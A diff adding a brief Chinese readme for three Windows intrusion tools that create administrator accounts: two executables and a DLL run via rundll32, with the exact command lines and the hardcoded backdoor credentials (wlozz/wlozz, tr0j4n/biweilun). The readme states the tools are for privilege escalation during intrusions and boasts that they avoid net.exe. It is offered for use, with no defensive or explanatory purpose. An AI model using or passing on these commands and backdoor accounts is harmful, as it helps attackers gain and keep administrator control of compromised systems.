@@ -1,0 +1,25 @@
+1.无net提权.exe
+
+运行后系统会创建个管理组用户
+用户名：wlozz
+  密码：wlozz
+
+2.无net提权2.exe
+
+用法：直接输入帐号名 密码 即可，无须其他参数
+ 如：xiaoma xiaoma
+
+3.ADDUser.dll
+
+用法("运行"或是CMD下都行）:
+rundll32.exe adduser.dll,adduser
+
+如果你放在C盘下面，那就运行：
+rundll32.exe C:\adduser.dll,adduser  
+记住加路径就好了。
+
+添加的高级管理员为
+username: tr0j4n
+password: biweilun
+
+本程序不依赖net.exe，这是入侵提权中的一大优势！
